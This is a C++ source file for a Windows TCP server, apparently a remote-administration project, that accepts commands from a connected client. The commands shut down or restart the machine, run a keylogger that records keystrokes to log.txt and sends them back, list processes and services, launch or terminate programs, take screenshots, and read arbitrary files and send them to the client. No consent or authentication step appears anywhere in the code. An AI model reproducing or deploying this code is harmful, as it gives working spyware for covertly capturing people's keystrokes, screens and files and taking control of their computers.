#include "server_socket.h"


Server::Server(int port)
    : port(port), listenSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

Server::~Server() {
    // Clean up GDI+
    GdiplusShutdown(gdiplusToken);
    
    if (listenSocket != INVALID_SOCKET) {
        closesocket(listenSocket);
    }
    WSACleanup();
}

bool Server::start() {
    // Create socket
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);

    // Bind socket
    int result = bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    // Listen for incoming connections
    result = listen(listenSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    std::cout << "Server listening on port " << port << std::endl;
    return true;
}

void Server::listenForConnections() {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
            continue;
        }

        // Handle the connected client synchronously
        handleClient(clientSocket);

        closesocket(clientSocket);
    }
}

// // Function to take a screenshot and save it as a PNG file
// void Server::takeScreenshot(const std::string& filename) {
//     // Initialize GDI+
//     GdiplusStartupInput gdiplusStartupInput;
//     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

//     // Get the screen dimensions
//     HDC screenDC = GetDC(NULL);
//     HDC memoryDC = CreateCompatibleDC(screenDC);
//     int width = GetSystemMetrics(SM_CXSCREEN);
//     int height = GetSystemMetrics(SM_CYSCREEN);

//     // Create a compatible bitmap
//     HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, width, height);
//     SelectObject(memoryDC, hBitmap);

//     // BitBlt to copy the screen to the bitmap
//     BitBlt(memoryDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

//     // Create GDI+ Image from the bitmap
//     Bitmap bitmap(hBitmap, NULL);
//     CLSID clsid;
//     HRESULT result = CLSIDFromString(L"{557CC3D0-1A3A-11D1-AD6E-00A0C9138F8C}", &clsid); // CLSID for PNG
//     if (FAILED(result)) {
//         std::cerr << "Failed to get CLSID for PNG." << std::endl;
//         return; // Handle error appropriately
//     }

//     // Save the image as a PNG file
//     WCHAR wFilename[MAX_PATH];
//     MultiByteToWideChar(CP_UTF8, 0, filename.c_str(), -1, wFilename, MAX_PATH);
//     bitmap.Save(wFilename, &clsid, NULL);

//     // Clean up
//     DeleteObject(hBitmap);
//     DeleteDC(memoryDC);
//     ReleaseDC(NULL, screenDC);
//     GdiplusShutdown(gdiplusToken);
// }

std::vector<unsigned char> Server::captureScreenshot() {
    std::vector<unsigned char> imageData;

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Capture screen to bitmap
    HDC hScreenDC = GetWindowDC(GetDesktopWindow());  // Use GetWindowDC to capture the entire screen
    // HDC hScreenDC = GetDC(nullptr);
    int width = GetDeviceCaps(hScreenDC, HORZRES);    // Get the full width of the screen
    int height = GetDeviceCaps(hScreenDC, VERTRES);   // Get the full height of the screen

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    
    // Select the bitmap into the memory device context
    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);
    
    // BitBlt from the screen device context to the memory device context
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    // Restore the original bitmap and clean up GDI objects
    SelectObject(hMemoryDC, oldBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(GetDesktopWindow(), hScreenDC);
    
    // Save bitmap to "screenshot.jpg"
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);
    Bitmap bitmap(hBitmap, nullptr);
    bitmap.Save(L"screenshot.jpg", &clsid, nullptr);
    
    // Clean up GDI objects
    DeleteObject(hBitmap);
    GdiplusShutdown(gdiplusToken);
    
    // Read the saved image into imageData
    std::ifstream file("screenshot.jpg", std::ios::binary);
    if (file.is_open()) {
        imageData.assign((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
    }

    return imageData;
}


// Helper function to get CLSID of JPEG encoder
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;          // number of image encoders
    UINT size = 0;        // size of the image encoder array in bytes
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1; // Failure

    std::vector<BYTE> buffer(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buffer.data());
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            return i;
        }
    }
    return -1; // Failure
}

// Function to send a screenshot image to the client
void Server::sendScreenshot(SOCKET clientSocket, const std::string &filePath) {
    std::vector<unsigned char> imageData = captureScreenshot();
    uint32_t dataSize = htonl(imageData.size());

    // Send size first
    send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);

    // Send image data
    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
}


void Server::handleClient(SOCKET clientSocket) {
    char recvbuf[512];
    int recvbuflen = 512;

    while (true) {
        memset(recvbuf, 0, recvbuflen);  // Clear buffer
        int result = recv(clientSocket, recvbuf, recvbuflen, 0);

        if (result > 0) {
            std::string receivedMessage(recvbuf, result);
            std::cout << "Received message: " << receivedMessage << std::endl;

            if (receivedMessage == "shutdown") {
                std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
                shutdownServer();
                closesocket(clientSocket);
                closesocket(listenSocket);
                break;  // Exit the loop to shut down
            } else if (receivedMessage == "restart") {
                std::cout << "Restart command received. Server is restarting..." << std::endl;
                restartServer();
                break;  // Optional: break to end client handling if restarting the server
            } else if (receivedMessage == "startKeylogger") {
                std::cout << "Keylogger command received." << std::endl;
                startKeyLogger();
            } else if (receivedMessage == "offKeylogger") {
                std::cout << "Keylogger stop command received." << std::endl;
                stopKeyLogger(clientSocket);
                break;
            } else if (receivedMessage == "listApp"){
                std::cout << "List app command received." << std::endl;
                ListApplications(clientSocket);
            }
            else if(receivedMessage.substr(0, 7) == "openApp"){
                std::cout << "Open app command received." << std::endl;
                std::string appNameStr = receivedMessage.substr(8);
                openProcess(appNameStr, clientSocket);
            }
            else if(receivedMessage.substr(0, 8) == "closeApp"){
                std::cout << "Close app command received." << std::endl;
                DWORD processID = stoi(receivedMessage.substr(9));
                closeProcess(processID, clientSocket);
            }
            else if(receivedMessage == "listService"){
                std::cout << "List service command received." << std::endl;
                ListServices(clientSocket);
            }
            // else if (receivedMessage == "screenshot") {
            //     std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
            //     takeScreenshot("screenshot.png");
            //     sendScreenshot(clientSocket, "screenshot.png");
            // }
            else if (receivedMessage.substr(0, 9) == "copy_file") {
                std::istringstream iss(receivedMessage);
                std::string command, sourceFileName, destinationFileName;
                std::getline(iss, command, '|');
                std::getline(iss, sourceFileName, '|');
                std::getline(iss, destinationFileName);
                copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
            } else {
                std::cout << "Unknown command received: " << receivedMessage << std::endl;
            }
        } else if (result == 0) {
            std::cout << "Connection closing..." << std::endl;
            break;
        } else {
            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            break;
        }
    }

    closesocket(clientSocket);
    exit(0);
}

// Implementation of copyFileAndSend
void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName) {
    std::ifstream sourceFile(sourceFileName, std::ios::binary);
    if (!sourceFile) {
        std::string errorMessage = "Failed to open source file: " + sourceFileName;
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        return;
    }

    // Create the destination file for writing
    std::ofstream destinationFile(destinationFileName, std::ios::binary);
    if (!destinationFile) {
        std::string errorMessage = "Failed to create destination file: " + destinationFileName;
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        return;
    }

    // Copy the file content
    destinationFile << sourceFile.rdbuf();

    // Close both files
    sourceFile.close();
    destinationFile.close();

    // Send the copied file back to the client
    std::ifstream copiedFile(destinationFileName, std::ios::binary);
    if (copiedFile) {
        // Get the size of the file
        copiedFile.seekg(0, std::ios::end);
        std::streamsize size = copiedFile.tellg();
        copiedFile.seekg(0, std::ios::beg);

        // Send the size first
        uint32_t fileSize = htonl(size);
        send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

        // Send the file data
        char buffer[4096];
        while (copiedFile.read(buffer, sizeof(buffer))) {
            send(clientSocket, buffer, copiedFile.gcount(), 0);
        }
        // Send any remaining bytes
        if (copiedFile.gcount() > 0) {
            send(clientSocket, buffer, copiedFile.gcount(), 0);
        }

        std::cout << "File copied and sent back to client successfully." << std::endl;
    } else {
        std::cerr << "Failed to read the copied file." << std::endl;
    }
}


//====================================================================================
void Server::shutdownServer() {


    // Execute Windows shutdown command
    int result = system("shutdown /s /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}

void Server::restartServer(){
    // Execute Windows shutdown command
    int result = system("shutdown /r /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}

//Keylogger
void Server::startKeyLogger() {
    isLogging = true;
    if (!keyLoggerThread.joinable()) 
        keyLoggerThread = std::thread(&Server::keyLogger, this);
        std::cout << "Keylogger started.\n";
}
// Function to stop keylogger and send log file to client
void Server::stopKeyLogger(SOCKET clientSocket) {
    isLogging = false;
    if (keyLoggerThread.joinable()) 
        keyLoggerThread.join();   
    copyFileAndSend(clientSocket, "log.txt", "log.txt");
    
}

void Server::keyLogger() {
    std::ofstream outputFile("log.txt", std::ios::app);  // Open file in append mode
    if (!outputFile.is_open()) {
        std::cerr << "Failed to open log file for writing.\n";
        return;
    }

    std::map<int, std::string> keyMap = {
        {VK_BACK, "[BACKSPACE]"},
        {VK_RETURN, "[ENTER]"},
        {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESCAPE]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_MENU, "[ALT]"},
        {VK_SPACE, "[SPACE]"},
        {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_SHIFT, "[SHIFT]"}
    };

    while (isLogging) {
        Sleep(10);
        for (int i = 8; i <= 255; i++) {
           if (GetAsyncKeyState(i) == -32767) {
                std::lock_guard<std::mutex> lock(logMutex);
                // Check if the key is in the special key map
                auto it = keyMap.find(i);
                if (it != keyMap.end()) {
                    outputFile << it->second;  //Dpecial keys
                } else {
                    if ((i >= 0x30 && i <= 0x39) ||    // Numbers 0-9
                            (i >= 0x41 && i <= 0x5A)) {  // Letters A-Z and a-z
                            outputFile << static_cast<char>(i);
                        }
                        break;
                }
                outputFile.flush();  // Flush after each keystroke
            }
        }
    }
    outputFile.close();  
}


bool Server::hasVisibleWindow(DWORD processID) {
    HWND hwnd = GetTopWindow(NULL);
    while (hwnd) {
        DWORD windowProcessID;
        GetWindowThreadProcessId(hwnd, &windowProcessID);
        if (windowProcessID == processID && IsWindowVisible(hwnd)) {
            return true;
        }
        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
    }
    return false;
}

//List app https://stackoverflow.com/questions/77231403/get-a-list-of-open-application-windows-in-c-windows
void Server::ListApplications(SOCKET clientSocket) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    std::ofstream outfile("applications.txt");

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take a snapshot of the processes." << std::endl;
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Failed to retrieve information for the first process." << std::endl;
        CloseHandle(hProcessSnap);
        return;
    }
    auto timenow = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); 
    outfile << "Current time:" << ctime(&timenow) << std::endl;
    outfile << "Application name" << std::setw(35) << "Process ID" << std::endl;
    do {
        if (hasVisibleWindow(pe32.th32ProcessID)) {
            outfile << std::left << std::setw(40)
                <<  pe32.szExeFile  // Service name
                << std::right << pe32.th32ProcessID  // Process ID
                << std::endl;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    outfile.close();
}

//open/close app https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes?redirectedfrom=MSDN
void Server::openProcess(const std::string& appName, SOCKET clientSocket)
{
    HINSTANCE hInstance = ShellExecute(
        NULL,           // No parent window
        "open",         // Action to perform
        appName.c_str(),// Application name
        NULL,           // No parameters
        NULL,           // Default directory
        SW_SHOWNORMAL   // Show the application window normally
    );

    if ((INT_PTR)hInstance <= 32) {
        // Error handling if ShellExecute fails
        std::string errorMessage = "Failed to open application: " + appName;
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        std::cerr << "ShellExecute failed with error code: " << (INT_PTR)hInstance << std::endl;
    } else {
        std::string message = "Successfully opened " + appName;
        send(clientSocket, message.c_str(), message.size(), 0);
    }
}

void Server::closeProcess(const DWORD& processId, SOCKET clientSocket) //chatgpt
{
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
    if (hProcess == NULL) {
        std::string errorMessage = "Failed to open process with ID: " + std::to_string(processId);
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        std::cerr << "OpenProcess failed with error code: " << GetLastError() << std::endl;
        return;
    }

    // Terminate the process
    if (!TerminateProcess(hProcess, 0)) {
        std::string errorMessage = "Failed to terminate process with ID: " + std::to_string(processId);
        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
        std::cerr << "TerminateProcess failed with error code: " << GetLastError() << std::endl;
    } else {
        std::string message = "Successfully terminated process with ID: " + std::to_string(processId);
        send(clientSocket, message.c_str(), message.size(), 0);
    }

    // Close the handle to the process
    CloseHandle(hProcess);
}
//List services
void Server::ListServices(SOCKET clientSocket){
        SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
        if (!scmHandle) {
            std::cerr << "Failed to open Service Control Manager." << std::endl;
            return;
        }
        
        // Define variables to hold service information
        DWORD bytesNeeded = 0, serviceCount = 0;
        DWORD resumeHandle = 0;
        ENUM_SERVICE_STATUS_PROCESS* serviceStatus = nullptr;

        // Query the number of services
        EnumServicesStatusEx(
            scmHandle,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            nullptr,
            0,
            &bytesNeeded,
            &serviceCount,
            &resumeHandle,
            nullptr
        );

        // Allocate memory for the service information
        serviceStatus = (ENUM_SERVICE_STATUS_PROCESS*)malloc(bytesNeeded);
        if (!serviceStatus) {
            std::cerr << "Memory allocation failed." << std::endl;
            CloseServiceHandle(scmHandle);
            return;
        }

        // Retrieve the list of services
        if (!EnumServicesStatusEx(
            scmHandle,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            (LPBYTE)serviceStatus,
            bytesNeeded,
            &bytesNeeded,
            &serviceCount,
            &resumeHandle,
            nullptr
        )) {
            std::cerr << "Failed to enumerate services." << std::endl;
            free(serviceStatus);
            CloseServiceHandle(scmHandle);
            return;
        }
        std::ofstream ofs("ListOfServices.txt");
        if(!ofs.is_open()){
            std::cout << "cannot open file";
            free(serviceStatus);
            CloseServiceHandle(scmHandle);
            return;
        }


        // Loop through the services and print the ones that are running
          // Determine the maximum width for service names
        auto timenow = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); 
        ofs << "Current time:" << ctime(&timenow) << std::endl;
        ofs << "Services name" << std::setw(35) << "Process ID" << std::endl;
        for (DWORD i = 0; i < serviceCount; ++i) {
            if (serviceStatus[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) {
             
                ofs << std::left << std::setw(40)
                << serviceStatus[i].lpServiceName  // Service name
                << std::right << serviceStatus[i].ServiceStatusProcess.dwProcessId  // Process ID
                << std::endl;
            }
        }

        // Clean up
        free(serviceStatus);
        CloseServiceHandle(scmHandle);
        ofs.close();
       
}
//open/close services